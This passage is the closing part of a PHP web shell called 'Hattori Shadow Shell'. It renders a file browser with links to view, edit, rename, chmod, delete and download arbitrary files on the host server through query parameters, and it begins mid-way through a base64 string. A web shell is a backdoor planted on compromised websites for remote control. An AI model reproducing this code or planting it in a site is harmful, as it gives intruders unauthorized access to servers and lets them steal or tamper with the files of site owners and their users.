gQU2nX0IFZdT9bkF0uhQBfXtQHhALP5R+tiCyzbUErRp6UA7NR2hAag//2Q=="';
							}elseif ($ext == "css"){
								echo 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwtWB9eeGLJQrik2mQbGDYUjCLVUt68tATaQ&usqp=CAU"';
							}elseif ($ext == "png"){
								echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
							}elseif ($ext == "jpg"){
								echo 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAgVBMVEX///8AAADk5ORbW1vIyMiXl5fU1NTh4eFJSUn6+vr19fXv7++3t7c6OjodHR1FRUV5eXmNjY1hYWGBgYFRUVHq6uq9vb3Q0NBycnKkpKSrq6tsbGwoKCgICAgzMzMiIiITExNeXl40NDSvr6+bm5ulpaVVVVWRkZF/f38QEBAYGBh7FZCBAAAH4ElEQVR4nO2daXuyOhCGiSKIS10Q1Ipaq1Zf//8PPNUWK5PFEEIyePJ860UhuWWZyWQm8TwJpYtsTcypm8p0SqP8jUG6H8VGAd+N832rYxDQtwFIyN4YYGTyBXyUb4pwaQmQkNAQ4cwa4bZvBLD/Zo2QbCIThK28uUvXiAqIXaOEOxOteVHxLo4NNHknbBtozPN64EE1YBYtE5L32pu0TVi/WbROWLtZtE/4UbNZtE9INr1am0RASL5qbRIDIVnU2SQKQjKpsUkchHWaRSSENZpFLIT1mUU0hCSpqUk8hMOazCIewrrMIiJCsqqlSUyE9ZhFVIS1BFFxEdZhFpER1mAWsRH+024WsRHqN4voCMlMc5P4CHWbRYSE5KS1SYyEes0iSkKtZhEnIQn0NYmU8EOfWURKSD61zS1iJdQ3t4iWUJtZxEuoyywiJtQURMVMSLSkv6Em1GIWcRMSDXOLyAmz6qNF5IQagqjYCavPLaInrBxExU9YdSjVAMKKHmoDCC/VTIZhQk+BkLQqtWiaUCVht1mEwcsTqpQGNIzw+zYOpJSOGksoq93LE7YdoZwcoUU5Qkk5QotyhJJyhBblCCXlCC3KEUrKEVqUI5SUI7QoTYRJfhkztdxltMu7ppY9lKTHzlVxfpnPQweXDp951+Lb38e0BGnvUKz8b4q6S8kp4b3FlSIqaiuVmHm23c1KOj8HnNruY0VNnwFObPewsp5Me6vM/WCTOI9o9PwC6DUSAc5t906L5i/9Fl4lehNf4SEVPqa9rfRVxgUt4OG3YXd1eh+k/jwIgjBsJWHgp+lgMssUepzN4oEf/KZc9K6XOi5mgoUAt3zXpsU/Cwr8NI+HYj8I+RkgrXmnTDrCx2ofsrPWw3Q85JzEH22E8i0XW+0/HhK96D9KOpLr3K18sacZxszT+FWKegil0rAkVmO8LCVKDpiPHQpCLxqLG8jk0rgHeAk9LxVd/yRZMrLCTCjwL4ay9b4R89uMhpCLKL9AK7vHeAi9PfPaA/kLsJfmRETIHI0+tzZ/Yr6GqAgZCaVliih6HxgIk/RwmsTnSYcZDKN8/VJVIpzhrFnCx+Ush3QwrA+uywsltfxDvFjtVqvFeDIIWr/NH1AQFiJ3W+oRLr5J7K+oT3mg2XR/xfjCR0h/KAt2f8PoVDTgjHiyIy8t3C4hfNESwbHbL6CwGLVlQlg98BBfZzyjStFby4TwRj2YRGpUmagteG+bEIRR/uwFVfea/FMCtE4IapT/HC/qFqqEPDAQgoq6u29KlaFR0Z+mEIIVZu5WG/qj6nsW2CYET2kealnD3vDiTPgJgU3InRoYxxWGAHATgqcxzziAteccj6wBhBmIwOQPI3DKoUveIEIwesjbhKF49vC/CYSw+joPnMJdApRNhW1CatYk/9BAh4YavWfdEVu042OTkHLM7gMgMKoC+0AQwZwZbVWsjfE/znTT9+g+OER3hUcY2Sb0lpNVe/a1iJcBa5bl/oiBXtGhVLyEQv0FWsCMGO2yNZPwocHXJHzsHAg1vshT2n44C9zDJn1p5AAhIe20NY+wVewZ7FXzCd9BlBAGEilPpWGEAZWPASPF1CR4kwgjn5FvAv05agA8in91XuIm7M9jZggNji0EC7kU6wbqIgTdFhDefbV+GAwmswvngkPYGX6YppgkWxMhCBsVsloYnncmsRct9FqZeSTmCC+CE5/FaTii1gjk3kQjhFnxxMJcrCIhtRUgN45hhBDEPAsfPkVC8Gp7/JtohPBYPPGog5D6BvM+p0YIQcyzo4OQriPgxPVNEIIPTTEtRpWQ0TF2BqMJwgM4sXBQmZBR78K8iwYI4T62xcCYMiGrZ6xZYAOEcBxQ9CHVCVllnNGecvJqJ3yjLlAcB6gTclYG3oP7WAyb6yEM5odRdvMot1NGL4oQFQh59aC9dPG5vba/vmxny+IjpIVw/fPe9UN2Dj4Y6FQhFC1kGSVhwgi5aiHcCtr1qBTKKoQKa8pqIRTv7QITBCsRlt+pWguhOCsZDtirEZZG1EIoLAw4wv+uSEim5XZ20EIoWt6dPqcqoXymvj5CQYsJPXivTEjIktNabYT8yweMzDMNhGRUYnqnVkLmMFwH4bfjIpmynwzo2FZpQp6xCNvMf9dD+O3fH54ukRAsmas/lCZkG4s5r3If/PhVVmjYdALOhzXqpR1uxWv5p7TduWfH39QL38f8zMjFafIoxRzRu7rjpR+2+r0ounIlSStMO+MZu9DiV2pji83sazo+LU/n1W4mX0yrTZdsMxyNNlup34tPmDw/uRHir+PSU03KxSXRvh7NXJcGSjQE41TZNEwwTib7qWmOhG4tu56vWRLvV/YKX9MnK2LxZ+2aoqc1tk3/2Ig+My9xF6WqpMOd7W4qaycbHQhihaI/61rHpWqIk8C/6j7E7c59XJrf/a/97e9AcfPV110ZMtfrr+7pCC3KEUrKEVqUI5SUI7QoRygpR2hRjlBSjtCiHKGkHKFFOUJJOUKLcoSScoQW5Qgl5QgtyhFKyhFalCOUlCO0KEcoKUdoUY5QUo7QonQTIs6n0UTYDQNcCruaCRHLEf7fCfv4d8594+9iJ6Uy+9zZkbjQ/LnYGyphUpmKWpYi7NnC63KV3wypr99vRmVWvOVIYqdCi5LbQ/CJfLWtUExoo+EO3pQuJNbMM611thCthHDXfz8CoepEY+iYAAAAAElFTkSuQmCC"';
							}elseif ($ext == "jpeg"){
								echo 'http://i.imgur.com/e8mkvPf.png"';
							}elseif($ext == "zip"){
								echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
							}elseif ($ext == "js"){
								echo 'data:image/png;base64,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g';
							}elseif ($ext == "ttf"){
								echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
							}elseif ($ext == "otf"){
								echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
							}elseif ($ext == "txt"){
								echo 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQeIq4RXo8Yo15DhFvtU1VUrdCxLN2KZL4Iy71S-e0Yd5LP_qC2DUKx_9Mn&s=10';
							}elseif ($ext == "ico"){
								echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
							}elseif ($ext == "conf"){
								echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
							}elseif ($ext == "htaccess"){
								echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
							}elseif ($ext == "sh"){
								echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
							}elseif ($ext == "py"){
								echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
							}elseif ($ext == "indsc"){
								echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
							}elseif ($ext == "sql"){
								echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
							}elseif ($ext == "pl"){
								echo 'http://i.imgur.com/PnmX8H9.png';
							}elseif ($ext == "pdf"){
								echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
							}elseif ($ext == "mp4"){
								echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
							}elseif ($ext == "mp3"){
								echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
							}elseif ($ext == "git"){
								echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
							}elseif ($ext == "md"){
								echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
							}else{
								echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
							}
							echo '" class="ico2"></img>';
							/* cek jika karaker terlalu panjang */
							if (strlen($file) > 25){
								$_file = substr($file, 0, 25)."...-.".$ext;												
							}else{
								$_file = $file;
							}
							echo' <a href="?dir='.$path.'&tool=view&file='.$path.'/'.$file.'">'.$_file.'</a></td>
							<td>'.formatSize(filesize($file)).'</td>
							<td>'.$ftime.'</td>
							<td><a href="?dir='.$path.'&tool=chmod_file&file='.$path.'/'.$file.'" class="text-center">';
							if(is_writable($path.'/'.$file)) echo '<font color="#00ff00">';
							elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
							echo perms($path.'/'.$file);
							if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font></a></td>
							<td class="d-flex">
								<a title="Edit" class="badge badge-success" href="?dir='.$path.'&tool=edit&file='.$path.'/'.$file.'">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
								<a title="Rename" class="badge badge-success" href="?dir='.$path.'&tool=rename&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
								<a title="Delete" class="badge badge-danger" href="?dir='.$path.'&tool=hapusf&file='.$path.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
								<a title="Download" class="badge badge-primary" href="?&dir='.$path.'&tool=download&file='.$path.'/'.$file.'" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
							</td>
						</tr>';
					}
				echo '</table></div><hr/>
				<center><a class="text-muted" href="">Copyright 2022 { Hattori Shadow Shell }</a></center><br/>';	
				echo "<a href='#' class='scrollToTop'><i class='fa fa-arrow-up up' aria-hidden='true'></i></a>";?>
			</div>
		</div>
	</body>
</html>
